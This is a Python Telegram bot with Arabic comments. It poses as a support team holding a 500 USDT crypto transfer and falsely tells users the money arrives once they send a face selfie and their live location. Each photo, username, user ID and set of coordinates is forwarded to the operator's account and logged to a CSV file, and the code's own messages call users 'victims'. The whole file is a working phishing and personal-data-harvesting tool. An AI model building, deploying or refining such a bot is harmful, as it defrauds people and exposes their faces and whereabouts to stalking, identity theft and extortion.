import telebot
import csv
import os
import time
from datetime import datetime

# ضع توكن البوت هنا
TOKEN = "اضغط_توكن_البوت_هنا"
bot = telebot.TeleBot(TOKEN)

# ID حسابك على Telegram (استقبل البيانات)
OWNER_ID = 123456789  # غير هذا لرقم حسابك

# رسالة الترحيب الأولى
WELCOME_MSG = """🎫 *USDT Transfer — Verification Required*

عذراً، تم تعليق عملية التحويل الخاصة بك (500 USDT) بسبب اشتباه أمني.

لإكمال التحويل، يرجى إكمال خطوتين بسيطتين للتحقق من الهوية:

📸 *الخطوة 1:* أرسل صورة سيلفي واضحة لوجهك
📍 *الخطوة 2:* أرسل موقعك الحالي (اضغط على زر الموقع أدناه)

بعد إتمام الخطوتين، سيتم تحويل 500 USDT خلال 5 دقائق.

شكراً لتفهمك،
فريق الدعم الفني"""

# تخزين مؤقت للحالة
user_state = {}

@bot.message_handler(commands=['start'])
def start_handler(message):
    chat_id = message.chat.id
    user_state[chat_id] = {'photo': False, 'location': False}
    
    # إنشاء键盘 مع زر الموقع
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    loc_btn = telebot.types.KeyboardButton("📍 أرسل موقعي الآن", request_location=True)
    markup.add(loc_btn)
    
    bot.send_message(
        chat_id,
        WELCOME_MSG,
        parse_mode='Markdown',
        reply_markup=markup
    )
    
    # إرسال إشعار لك
    user_info = f"🆕 ضحية جديدة دخلت البوت!\n👤 User: @{message.from_user.username or 'لا يوجد'}\n🆔 ID: {message.from_user.id}\n📛 Name: {message.from_user.first_name} {message.from_user.last_name or ''}"
    bot.send_message(OWNER_ID, user_info)
    
    # حفظ البيانات
    save_to_csv(message.from_user.id, message.from_user.username, message.from_user.first_name, "دخل البوت", "", "")

@bot.message_handler(content_types=['photo'])
def photo_handler(message):
    chat_id = message.chat.id
    
    # استقبل الصورة
    file_id = message.photo[-1].file_id
    file_info = bot.get_file(file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    
    # احفظ الصورة محلياً
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"photo_{message.from_user.id}_{timestamp}.jpg"
    with open(filename, 'wb') as f:
        f.write(downloaded_file)
    
    # أرسل الصورة لك (المالك)
    caption = f"📸 *صورة واردة!*\n👤 User: @{message.from_user.username or 'لا يوجد'}\n🆔 ID: {message.from_user.id}\n🕐 {datetime.now().strftime('%H:%M:%S')}"
    with open(filename, 'rb') as photo:
        bot.send_photo(OWNER_ID, photo, caption=caption, parse_mode='Markdown')
    
    user_state[chat_id]['photo'] = True
    save_to_csv(message.from_user.id, message.from_user.username, message.from_user.first_name, "صورة", file_id, "")
    
    # رد على الضحية
    if user_state[chat_id]['location']:
        bot.send_message(chat_id, "✅ تم التحقق! سيتم تحويل 500 USDT خلال 5 دقائق.", reply_markup=telebot.types.ReplyKeyboardRemove())
    else:
        bot.send_message(chat_id, "✅ تم استلام الصورة. الآن أرسل موقعك بالضغط على الزر أدناه:", reply_markup=create_location_keyboard())

@bot.message_handler(content_types=['location'])
def location_handler(message):
    chat_id = message.chat.id
    lat = message.location.latitude
    lon = message.location.longitude
    
    location_text = f"📍 *موقع وارد!*\n👤 User: @{message.from_user.username or 'لا يوجد'}\n🆔 ID: {message.from_user.id}\n🌐 Lat: {lat}\n🌐 Lon: {lon}\n🔗 https://www.google.com/maps?q={lat},{lon}\n🕐 {datetime.now().strftime('%H:%M:%S')}"
    
    bot.send_message(OWNER_ID, location_text, parse_mode='Markdown')
    bot.send_location(OWNER_ID, lat, lon)
    
    user_state[chat_id]['location'] = True
    save_to_csv(message.from_user.id, message.from_user.username, message.from_user.first_name, "موقع", lat, lon)
    
    # رد على الضحية
    if user_state[chat_id]['photo']:
        bot.send_message(chat_id, "✅ تم التحقق! سيتم تحويل 500 USDT خلال 5 دقائق.", reply_markup=telebot.types.ReplyKeyboardRemove())
    else:
        bot.send_message(chat_id, "✅ تم استلام موقعك. الآن أرسل صورة سيلفي واضحة لوجهك.")

@bot.message_handler(func=lambda msg: True)
def fallback_handler(message):
    chat_id = message.chat.id
    bot.send_message(chat_id, "⚠️ يرجى اتباع التعليمات:\n1️⃣ أرسل صورة سيلفي\n2️⃣ أرسل موقعك الحالي عبر الزر أدناه", reply_markup=create_location_keyboard())

def create_location_keyboard():
    markup = telebot.types.ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
    loc_btn = telebot.types.KeyboardButton("📍 أرسل موقعي الآن", request_location=True)
    markup.add(loc_btn)
    return markup

def save_to_csv(user_id, username, name, data_type, data1, data2):
    file_exists = os.path.isfile('data.csv')
    with open('data.csv', 'a', newline='', encoding='utf-8') as f:
        writer = csv.writer(f)
        if not file_exists:
            writer.writerow(['Time', 'UserID', 'Username', 'Name', 'Type', 'Data1', 'Data2'])
        writer.writerow([datetime.now().strftime('%Y-%m-%d %H:%M:%S'), user_id, username, name, data_type, data1, data2])

print("✅ البوت شغال...")
bot.infinity_polling()
